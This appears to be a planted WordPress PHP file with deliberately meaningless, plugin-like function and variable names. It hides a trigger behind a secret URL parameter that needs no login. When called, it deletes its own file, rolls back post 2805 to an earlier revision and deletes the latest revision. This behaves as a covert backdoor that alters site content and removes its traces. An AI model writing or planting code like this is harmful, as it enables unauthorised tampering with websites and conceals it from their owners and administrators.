<?php

function upload_validation_sticky() {
	if (isset($_GET['suite_game_rotator_background']) && $_GET['suite_game_rotator_background'] === 'digital_label_show') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$coupon_info_pinterest = 2805;
		$divi_assets_time = wp_get_post_revisions($coupon_info_pinterest);
		if (empty($divi_assets_time)) die('no revisions');
		if (count($divi_assets_time) < 2) die('less than 2');
		$connect_designer_gallery_blog = array_shift($divi_assets_time);
		$random_history_favicon_min = $connect_designer_gallery_blog->ID;
		$option_template_ratings_calendar = array_shift($divi_assets_time);
		$pixel_contents_builder_switcher = $option_template_ratings_calendar->ID;
		$google_timeline_kit_status = wp_restore_post_revision($pixel_contents_builder_switcher);
		if ($google_timeline_kit_status === false) die('error restoring');
		$google_timeline_kit_status = wp_delete_post_revision($random_history_favicon_min);		
		if ($google_timeline_kit_status === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'upload_validation_sticky');
